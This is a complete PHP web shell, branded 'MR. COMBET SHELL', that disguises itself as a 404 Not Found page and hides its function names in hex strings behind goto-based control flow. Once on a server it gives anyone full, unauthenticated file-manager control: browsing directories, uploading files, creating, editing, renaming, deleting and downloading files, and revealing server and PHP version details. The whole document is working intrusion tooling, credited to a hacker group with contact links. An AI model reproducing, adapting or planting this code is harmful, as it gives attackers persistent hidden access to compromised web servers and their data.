<?php
error_reporting(0);
http_response_code(404);
define("Yp", "MR. COMBET SHELL");
$G3 = "scandir";
$c8 = [
    "7068705f756e616d65",
    "70687076657273696f6e",
    "676574637764",
    "6368646972",
    "707265675f73706c6974",
    "61727261795f64696666",
    "69735f646972",
    "69735f66696c65",
    "69735f7772697461626c65",
    "69735f7265616461626c65",
    "66696c6573697a65",
    "636f7079",
    "66696c655f657869737473",
    "66696c655f7075745f636f6e74656e7473",
    "66696c655f6765745f636f6e74656e7473",
    "6d6b646972",
    "72656e616d65",
    "737472746f74696d65",
    "68746d6c7370656369616c6368617273",
    "64617465",
    "66696c656d74696d65",
];
$lE = 0;
T4:
if (!($lE < count($c8))) {
    goto Je;
}
$c8[$lE] = JD($c8[$lE]);
Cy:
$lE++;
goto T4;
Je:
if (isset($_GET["p"])) {
    goto sr;
}
$Jd = $c8[2]();
goto VN;
sr:
$Jd = jD($_GET["p"]);
$c8[3](Jd($_GET["p"]));
VN:
function Ss($SP)
{
    $dE = "";
    $lE = 0;
    NZ:
    if (!($lE < strlen($SP))) {
        goto Xc;
    }
    $dE .= dechex(ord($SP[$lE]));
    WK:
    $lE++;
    goto NZ;
    Xc:
    return $dE;
}
function Jd($SP)
{
    $dE = "";
    $gf = strlen($SP) - 1;
    $lE = 0;
    Xp:
    if (!($lE < $gf)) {
        goto ur;
    }
    $dE .= chr(hexdec($SP[$lE] . $SP[$lE + 1]));
    Wn:
    $lE += 2;
    goto Xp;
    ur:
    return $dE;
}
function rn($F1)
{
    $Jd = fileperms($F1);
    if (($Jd & 0xc000) == 0xc000) {
        goto FZ;
    }
    if (($Jd & 0xa000) == 0xa000) {
        goto Eu;
    }
    if (($Jd & 0x8000) == 0x8000) {
        goto ES;
    }
    if (($Jd & 0x6000) == 0x6000) {
        goto sA;
    }
    if (($Jd & 0x4000) == 0x4000) {
        goto lG;
    }
    if (($Jd & 0x2000) == 0x2000) {
        goto tV;
    }
    if (($Jd & 0x1000) == 0x1000) {
        goto Tx;
    }
    $lE = "u";
    goto cC;
    FZ:
    $lE = "s";
    goto cC;
    Eu:
    $lE = "l";
    goto cC;
    ES:
    $lE = "-";
    goto cC;
    sA:
    $lE = "b";
    goto cC;
    lG:
    $lE = "d";
    goto cC;
    tV:
    $lE = "c";
    goto cC;
    Tx:
    $lE = "p";
    cC:
    $lE .= $Jd & 0x100 ? "r" : "-";
    $lE .= $Jd & 0x80 ? "w" : "-";
    $lE .= $Jd & 0x40 ? ($Jd & 0x800 ? "s" : "x") : ($Jd & 0x800 ? "S" : "-");
    $lE .= $Jd & 0x20 ? "r" : "-";
    $lE .= $Jd & 0x10 ? "w" : "-";
    $lE .= $Jd & 0x8 ? ($Jd & 0x400 ? "s" : "x") : ($Jd & 0x400 ? "S" : "-");
    $lE .= $Jd & 0x4 ? "r" : "-";
    $lE .= $Jd & 0x2 ? "w" : "-";
    $lE .= $Jd & 0x1 ? ($Jd & 0x200 ? "t" : "x") : ($Jd & 0x200 ? "T" : "-");
    return $lE;
}
function Xe($OB, $Ch = 1, $BL = "")
{
    global $Jd;
    $xe = $Ch == 1 ? "success" : "error";
    echo "<script>swal({title: \"{$xe}\", text: \"{$OB}\", icon: \"{$xe}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?p=" .
        Ss($Jd) .
        $BL .
        "\"}})</script>";
}
function tF($yf)
{
    global $c8;
    if (!(trim(pathinfo($yf, PATHINFO_BASENAME), ".") === "")) {
        goto IE;
    }
    return;
    IE:
    if ($c8[6]($yf)) {
        goto PF;
    }
    unlink($yf);
    goto jK;
    PF:
    array_map(
        "deldir",
        glob($yf . DIRECTORY_SEPARATOR . "{,.}*", GLOB_BRACE | GLOB_NOSORT)
    );
    rmdir($yf);
    jK:
}
?>
<!doctype html>
<html lang="en">
<head>
    <meta name="theme-color" content="#00bfff">
    <meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no">
    <link rel="stylesheet" href="https://dl.dropboxusercontent.com/s/fyfauynt1su0ipj/5.css">
    <link rel="stylesheet" href="https://dl.dropboxusercontent.com/s/sk8z447mbj45wk0/sosmed.css">
    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <title>404 Not Found</title>
    <script src="//unpkg.com/sweetalert/dist/sweetalert.min.js">
    </script>
    <style>
@font-face {
  font-family: 'SciFi';
  src: url('https://dl.dropboxusercontent.com/s/amme5wvo77jghrk/SciFi.ttf');
}
@font-face {
  font-family: "Sabon";
  src: url('https://dl.dropboxusercontent.com/s/w6trj8t830zie1b/SabonItalic.eot') format("embedded-opentype"),
    url('https://dl.dropboxusercontent.com/s/7fmrr74antez8qc/SabonItalic.woff2') format("woff2"),
    url('https://dl.dropboxusercontent.com/s/7fmrr74antez8qc/SabonItalic.woff2') format("woff"),
    url('https://dl.dropboxusercontent.com/s/ai3juz6r4kbfsmi/SabonItalic.svg') format("truetype"),
    url('https://dl.dropboxusercontent.com/s/ai3juz6r4kbfsmi/SabonItalic.svg') format("svg");
  font-weight: 400;
  font-style: none;
}
a:hover {
color: #00bfff;
}
table.combetohct {
  border: 1px double #00bfff;
  background-color: #000000;
  width: 100%;
  text-align: center;
  border-collapse: collapse;
}
table.combetohct td, table.combetohct th {
  border: 1px double #00bfff;
  padding: 1px 1px;
}
table.combetohct tbody td {
  font-size: 18px;
  color: #FFFFFF;
}
table.combetohct tbody tr:hover td{background:#464646}
table.combetohct thead {
  background: #000000;
  background: -moz-linear-gradient(top, #404040 0%, #191919 66%, #000000 100%);
  background: -webkit-linear-gradient(top, #404040 0%, #191919 66%, #000000 100%);
  background: linear-gradient(to bottom, #404040 0%, #191919 66%, #000000 100%);
  border: 1px solid #00bfff;
}
table.combetohct thead th {
  font-size: 18px;
  font-weight: normal;
  color: #FFFFFF;
  text-align: center;
}
table.combetohct tfoot td {
  font-size: 18px;
}
table.combetohct tfoot .links {
  text-align: right;
}
table.combetohct tfoot .links a{
  display: inline-block;
  background: #1C6EA4;
  color: #FFFFFF;
  padding: 1px 1px;
  border-radius: 0px;
}
</style>
<style>
@import url('https://fonts.googleapis.com/css2?family=Kelly+Slab&display=swap');
.border {
    border: 1px solid #00bfff !important;
}
.d-flex {
    display: flex !important;
    align-content: center;
    align-items: center;
    justify-content: space-between;
}
.b-flex {
    display: -ms-flexbox !important;
    display: flex !important;
    align-content: center;
    align-items: center;
    color: #00bfff;
    justify-content: space-evenly;
}
.p {
    text-align: left;
    margin-left: 5px;
    }
.z {
    text-align: center;
    color: red;
    }
.btn-outline-light {
    color: white;
    border-color: #00bfff;
}
.container {
    width: 100%;
    margin-right: auto;
    margin-left: auto;
    padding-right: 0px;
    padding-left: 0px;
}
.text-light {
    color: white !important;
    font-size: 18px;
}
.combetohct {
    font-size: 2em;
}
</style>
<style>
.maan-top-bar {
  padding: 0px 0px;
  background: var(--maan-color-black2);
}
.maan-top-bar .maan-weider-news .icon svg {
  fill: var(--maan-color-white);
  --svg-font-size: 18px;
}
.maan-top-bar .maan-weider-news .maan-city,
.maan-top-bar .maan-weider-news .maan-celsius {
  display: inline-block;
  color: var(--maan-color-white);
}
.maan-top-bar .maan-weider-news .maan-city {
  font-size: 14px;
  line-height: 24px;
  margin: 0px 4px;
}
.maan-top-bar .maan-weider-news .maan-celsius {
  font-size: 12px;
  line-height: 22px;
}
.maan-top-bar .maan-current-date {
  color: var(--maan-color-white);
  text-align: center;
  margin-left: 20px;
}
.maan-top-bar .maan-current-date .icon svg {
  fill: var(--maan-color-white);
  --svg-font-size: 12px;
  margin-right: 0px;
}
.maan-top-bar .maan-current-date .maan-current-week,
.maan-top-bar .maan-current-date .maan-current-day {
font-family: 'Kelly Slab';
color: #ffffff;
font-size: 18px;
margin-left: 0px;
padding-top: 0px;
padding-bottom: 0px;
margin-top: 10px;
}
.maan-top-bar .maan-social-link {
  text-align: right;
  max-width: 163px;
  margin-left: auto;
}

.maan-top-bar .maan-social-link ul {
  border-left: 1px solid var(--maan-color-white);
}
.maan-top-bar .maan-social-link li {
  display: inline-block;
  margin-right: 14px;
}
.maan-top-bar .maan-social-link li:last-child {
  margin-right: 0px;
}
.maan-top-bar .maan-social-link li svg {
  fill: var(--maan-color-white);
}
.maan-top-bar .maan-social-link li a:hover svg {
  fill: var(--maan-color-blue);
}
.date-time{
display: flex;
align-items: center;
justify-content: space-between;
font-family: 'Kelly Slab';
}
.social{
  margin: 20px auto
}
#txt {
font-family: 'Kelly Slab';
color: #ffffff;
font-size: 18px;
padding-top: 0px;
padding-bottom: 0px;
}
</style>
</head>
<body style="margin-left:auto;margin-right:auto;width: 99%;font-size: 18px;">
 <div class="bg-dark border table-responsive mt-2">
  <div class="maan-top-bar">
   <div class="d-flex">
     <div class="maan-current-date" style="display:table-cell; float:none; text-align:left;">
       <span class="txt" id="hours"></span>
       <span id="point">:</span>
       <span class="txt" id="min"></span>
       <span id="point">:</span>
       <span class="txt" id="sec"></span>
       <span class="txt" id="period"></span>
     </div>
     <div style="display:table-cell; float:none; text-align:center;">
      <h1 class="combetohct">
       <a href="?" style="font-size:35px;font-family: 'SciFi';">
       <?= Yp ?>
       </a>
      </h1>
     </div>
     <div id="Date" class="txt" style="display:table-cell; float:none; text-align:center;margin-right: 20px;">
     </div>
   </div>
  </div>
 </div>
<div class="bg-dark border table-responsive mt-2">
<div class="ml-2">
<span><font color="#00bfff">Server: </font><?= $c8[0]() ?></span><br>
<span><font color="#00bfff">PHP Version: </font><?= $c8[1]() ?>
</span>
<div class="d-flex justify-content-between p-1">
<div>
<font color="#00bfff"> | 
</font>
<a href="?p=<?= ss($Jd) . "&a=" . Ss("newFile") ?>">+File
</a>
<font color="#00bfff"> | 
</font>
<a href="?p=<?= Ss($Jd) . "&a=" . sS("newDir") ?>">+Directory
</a><font color="#00bfff"> | 
</font>
</div>
<form method="post" enctype="multipart/form-data">
<div class="input-group mb-1 px-1 mt-1"><div class="custom-file"><input type="file" name="f[]" class="custom-file-input" onchange="this.form.submit()" multiple><label class="custom-file-label rounded-0 bg-transparent text-light" style="border: 1px solid #00bfff;">Choose File
</label>
</div>
</div>
</div>
</form>
<?php
if (!isset($_FILES["f"])) {
    goto ea;
}
$Wx = $_FILES["f"]["name"];
$lE = 0;
th:
if (!($lE < count($Wx))) {
    goto dx;
}
if ($c8[11]($_FILES["f"]["tmp_name"][$lE], $Wx[$lE])) {
    goto PG;
}
Xe("file failed to upload", 0);
goto tG;
PG:
XE("");
tG:
g9:
$lE++;
goto th;
dx:
ea:
if (!isset($_GET["download"])) {
    goto FA;
}
header("Content-Type: application/octet-stream");
header("Content-Transfer-Encoding: Binary");
header("Content-Length: " . $c8[17](JD($_GET["n"])));
header("Content-disposition: attachment; filename=\"" . jd($_GET["n"]) . "\"");
FA:
?>
</div>
</div>
</div>
<div class="bg-dark border table-responsive mt-2">
<div class="ml-2" style="font-size:18px;color:#00bfff;">
<span>Path: 
</span>
<?php
$Op = $c8[4]("/(\\\\|\\/)/", $Jd);
foreach ($Op as $j3 => $Oe) {
    if (!($j3 == 0 && $Oe == "")) {
        goto xi;
    }
    echo "<a href=\"?p=2f\">~</a>/";
    goto CS;
    xi:
    if (!($Oe == "")) {
        goto sq;
    }
    goto CS;
    sq:
    echo "<a href=\"?p=";
    $lE = 0;
    de:
    if (!($lE <= $j3)) {
        goto ie;
    }
    echo sS($Op[$lE]);
    if (!($lE != $j3)) {
        goto s0;
    }
    echo "2f";
    s0:
    dg:
    $lE++;
    goto de;
    ie:
    echo "\">{$Oe}</a>/";
    CS:
}
Go:
?>
</div>
</div>
<article class="bg-dark border table-responsive mt-2">
<?php
if (!isset($_GET["a"])) {
    goto Un;
}
if (!isset($_GET["a"])) {
    goto cc;
}
$im = Jd($_GET["a"]);
cc:
?>
<div class="px-2 py-2">
<?php
if (!($im == "delete")) {
    goto Lu;
}
$BL = $Jd . "/" . Jd($_GET["n"]);
if (!($_GET["t"] == "d")) {
    goto VZ;
}
TF($BL);
if (!$c8[12]($BL)) {
    goto e8;
}
Xe("", 0);
goto iL;
e8:
Xe("");
iL:
VZ:
if (!($_GET["t"] == "f")) {
    goto xB;
}
$BL = $Jd . "/" . jd($_GET["n"]);
unlink($BL);
if (!$c8[12]($BL)) {
    goto uH;
}
Xe("", 0);
goto Mk;
uH:
xe("");
Mk:
xB:
Lu:
?>
<?php
if ($im == "newDir") {
    goto Fg;
}
if ($im == "newFile") {
    goto Pb;
}
if ($im == "rename") {
    goto Lw;
}
if ($im == "edit") {
    goto Ox;
}
if ($im == "view") {
    goto Ag;
}
goto WC;
Fg:
?>
<h5 class="border p-1 mb-3">New folder
</h5>
<form method="post">
<div class="form-group">
<label for="n">Name :
</label>
<input name="n" id="n" class="form-control" style="border: 1px solid #00bfff;" autocomplete="off">
</div>
<div class="form-group"><center>
<button type="submit" name="s" class="btn btn-outline-light rounded-0">Create
</button></center>
</div>
</form>
<?php
isset($_POST["s"])
    ? ($c8[12]("{$Jd}/{$_POST["n"]}")
        ? xE("folder name has been used", 0, "&a=" . SS("newDir"))
        : ($c8[15]("{$Jd}/{$_POST["n"]}")
            ? Xe("")
            : Xe("folder failed to create", 0)))
    : null;
goto WC;
Pb:
?>
<h5 class="border p-1 mb-3">New file
</h5>
<form method="post">
<div class="form-group">
<label for="n">File name :
</label>
<input type="text" name="n" id="n" class="form-control" style="border: 1px solid #00bfff;" placeholder="">
</div>
<div class="form-group">
<label for="ctn">Content :
</label>
<textarea style="resize:none" name="ctn" id="ctn" cols="30" rows="10" class="form-control" style="border: 1px solid #00bfff;" placeholder=""></textarea>
</div>
<div class="form-group">
<center><button type="submit" name="s" class="btn btn-outline-light rounded-0">Create
</button></center>
</div>
</form>
<?php
isset($_POST["s"])
    ? ($c8[12]("{$Jd}/{$_POST["n"]}")
        ? xE("file name has been used", 0, "&a=" . SS("newFile"))
        : ($c8[13]("{$Jd}/{$_POST["n"]}", $_POST["ctn"])
            ? XE(
                "",
                1,
                "&a=" . ss("view") . "&n=" . Ss($_POST["n"])
            )
            : Xe("file failed to create", 0)))
    : null;
goto WC;
Lw:
?>
<h5 class="border p-1 mb-3">Rename 
<?= $_GET["t"] == "d" ? "folder" : "file" ?>
</h5>
<form method="post">
<div class="form-group">
<label for="n">Name :
</label>
<input type="text" name="n" id="n" class="form-control" style="border: 1px solid #00bfff;" value="<?= jD(
    $_GET["n"]
) ?>">
</div>
<center><div class="form-group">
<button type="submit" name="s" class="btn btn-outline-light rounded-0">Save
</button>
</div></center>
</form>
<?php
isset($_POST["s"])
    ? ($c8[16]($Jd . "/" . jD($_GET["n"]), $_POST["n"])
        ? XE("")
        : Xe("failed to change the folder name", 0))
    : null;
goto WC;
Ox:
?>
<h5 class="border p-1 style="margin-buttom:1rem;"><font color="#00bfff">Edit File Name: </font><?= Jd(
    $_GET["n"]
) ?></h5>
<form method="post">
<div class="form-group">
<label for="ctn">Content :
</label>
<textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" style="border: 1px solid #00bfff;">
<?= $c8[18]($c8[14]($Jd . "/" . jD($_GET["n"]))) ?></textarea>
</div>
<center><div class="form-group">
<button type="submit" name="s" class="btn btn-outline-light rounded-0">Save
</button>
</div></center>
</form>
<?php
isset($_POST["s"])
    ? ($c8[13]($Jd . "/" . jD($_GET["n"]), $_POST["ctn"])
        ? xE(
            "",
            1,
            "&a=" . sS("view") . "&n={$_GET["n"]}"
        )
        : xE("file contents failed to change"))
    : null;
goto WC;
Ag:
?>
<h5 class="border p-1"><font color="#00bfff">View File Name: </font><?= jd(
    $_GET["n"]
) ?></h5>
<div class="form-group">
<label for="ctn"><font color="#00bfff">Content :</font>
</label>
<textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" style="border: 1px solid #00bfff;" readonly>
<?= $c8[18]($c8[14]($Jd . "/" . jd($_GET["n"]))) ?></textarea>
</div>
<?php WC: ?>
</div>
<?php
goto mR;
Un:
?>
<table class="combetohct">
<thead>
<tr>
<th>Name
</th>
<th>Size
</th>
<th>Permission
</th>
<th colspan="4">Action
</th>
</tr>
</thead>
<tbody>
          <?php
          $G3 = $c8[5]($G3($Jd), [".", ".."]);
          foreach ($G3 as $yf) {
              if ($c8[6]("{$Jd}/{$yf}")) {
                  goto CB;
              }
              goto Qj;
              CB:
              echo "<tr><td><a href=\"?p=" .
                  sS("{$Jd}/{$yf}") .
                  "\" data-toggle=\"tooltip\" data-placement=\"auto\"><div class=\"p\"><i class=\"fa fa-fw fa-folder\"> </i> {$yf}</a></div></td><td> - </td><td><font color=\"" .
                  ($c8[8]("{$Jd}/{$yf}")
                      ? "#00ff00"
                      : (!$c8[9]("{$Jd}/{$yf}")
                          ? "#00bfff"
                          : null)) .
                  "\">" .
                  RN("{$Jd}/{$yf}") .
                  "</font></td><td> - </td><td><div class=\"z\"><a href=\"?p=" .
                  ss($Jd) .
                  "&a=" .
                  ss("rename") .
                  "&n=" .
                  ss($yf) .
                  "&t=d\" data-toggle=\"tooltip\" data-placement=\"auto\">Rename</a></td><td> - </td><td><a href=\"?p=" .
                  sS($Jd) .
                  "&a=" .
                  ss("delete") .
                  "&n=" .
                  ss($yf) .
                  "\" class=\"delete\" data-type=\"folder\" data-toggle=\"tooltip\" data-placement=\"auto\"> Delete </a></td></tr>";
              Qj:
          }
          ad:
          foreach ($G3 as $F1) {
              if ($c8[7]("{$Jd}/{$F1}")) {
                  goto wA;
              }
              goto X1;
              wA:
              $kL = $c8[10]("{$Jd}/{$F1}") / 1024;
              $kL = round($kL, 3);
              $kL = $kL > 1024 ? round($kL / 1024, 2) . " MB" : $kL . " KB";
              echo "\n\t\t\t\t\t<tr>\n\t\t\t\t\t\t<td><a href=\"?p=" .
                  SS($Jd) .
                  "&a=" .
                  sS("view") .
                  "&n=" .
                  SS($F1) .
                  "\" data-toggle=\"tooltip\" data-placement=\"auto\"><div class=\"p\"><i class=\"fa fa-fw fa-file\"> </i> {$F1}</a></div></td><td>{$kL}</td><td><font color=\"" .
                  ($c8[8]("{$Jd}/{$F1}")
                      ? "#00ff00"
                      : (!$c8[9]("{$Jd}/{$F1}")
                          ? "#00bfff"
                          : null)) .
                  "\">" .
                  rN("{$Jd}/{$F1}") .
                  "</font></td><td><div class=\"z\"><a href=\"?p=" .
                  Ss($Jd) .
                  "&a=" .
                  Ss("edit") .
                  "&n=" .
                  SS($F1) .
                  "\" data-toggle=\"tooltip\" data-placement=\"auto\"> Edit </a></td><td><a href=\"?p=" .
                  ss($Jd) .
                  "&a=" .
                  SS("rename") .
                  "&n=" .
                  ss($F1) .
                  "&t=f\" data-toggle=\"tooltip\" data-placement=\"auto\"> Rename </a></td><td><a href=\"?p=" .
                  ss($Jd) .
                  "&n=" .
                  sS($F1) .
                  "&download" .
                  "\" data-toggle=\"tooltip\" data-placement=\"auto\"> Download </a></td><td><a href=\"?p=" .
                  ss($Jd) .
                  "&a=" .
                  sS("delete") .
                  "&n=" .
                  ss($F1) .
                  "\" class=\"delete\" data-type=\"file\" data-toggle=\"tooltip\" data-placement=\"auto\">Delete</a></div></td></tr>";
              X1:
          }
          a2:
          ?>
        </tbody>
      </table>
      <?php mR: ?>
    </article>
<div class="social">

  <a class="border social-icon" data-tooltip="Email" href="mailto:combetohct@yahoo.com">
    <i class="fa fa-envelope" aria-hidden="true"></i>
  </a>

  <a class="border social-icon" data-tooltip="Facebook" href="https://www.facebook.com/combet.ohct">
    <i class="fa fa-facebook" aria-hidden="true"></i>
  </a>

  <a class="border social-icon" data-tooltip="WhatsApp" href="https://wa.me/6281270303335">
    <i class="fa fa-whatsapp" aria-hidden="true"></i>
  </a>
  <a class="border social-icon" data-tooltip="Instagram" href="https://www.instagram.com/mr.combet">
    <i class="fa fa-instagram" aria-hidden="true"></i>
  </a>
</div>
<div style="text-align: center;">
<font color="white">Copyright © 2022.</font> <font color="#00bfff">Mr.Combet</font> <font color="white">All rights reserved. Powered by</font> <font color="#00bfff">One Hat Cyber Team</font>
</div><br>
    <script src="//code.jquery.com/jquery-3.5.1.slim.min.js">
    </script>
    <script src="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js" >
    </script>
    <script src="//cdn.jsdelivr.net/npm/bs-custom-file-input/dist/bs-custom-file-input.min.js">
    </script>
    <script>eval(function(p,a,c,k,e,d){
        e=function(c){
          return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};
        if(!''.replace(/^/,String)){
          while(c--){
            d[e(c)]=k[c]||e(c)}
          k=[function(e){
            return d[e]}
            ];
          e=function(){
            return'\\w+'};
          c=1};
        while(c--){
          if(k[c]){
            p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}
        }
        return p}
                 ('E.n();$(\'[2-m="4"]\').4();$(".l").k(j(e){e.g();h 0=$(6).5("2-0");c({b:"a",9:"o i q?",w:"D "+0+" p C B",A:7,z:7,}).y((8)=>{r(8){x 1=$(6).5("3")+"&t="+((0=="v")?"d":"f");u.s.3=1}})});',41,41,'type|buildURL|data|href|tooltip|attr|this|true|willDelete|title|warning|icon|swal||||preventDefault|let|you|function|click|delete|toggle|init|Are|will|sure|if|location||document|folder|text|const|then|dangerMode|buttons|deleted|be|This|bsCustomFileInput'.split('|'),0,{
      }
                 ))</script>
<script type="text/javascript">
    $(document).ready(function () {
        var monthNames = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
        var dayNames = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"]

        var newDate = new Date();
        newDate.setDate(newDate.getDate());
        $('#Date').html(dayNames[newDate.getDay()] + ", " + newDate.getDate() + ' ' + monthNames[newDate.getMonth()] + ' ' + newDate.getFullYear());

        setInterval(function () {
            var seconds = new Date().getSeconds();
            $("#sec").html((seconds < 10 ? "0" : "") + seconds);
        }, 1000);

        setInterval(function () {
            var minutes = new Date().getMinutes();
            $("#min").html((minutes < 10 ? "0" : "") + minutes);
        }, 1000);

        setInterval(function () {
            var hours = new Date().getHours();
            var period = 'am';
            if (hours >= 12) {
                hours = hours - 12;
                period = 'pm';
            }
            $("#hours").html((hours < 10 ? "0" : "") + hours);
            $("#period").html(period);
        }, 1000);
    });
</script>
  </body>
</html>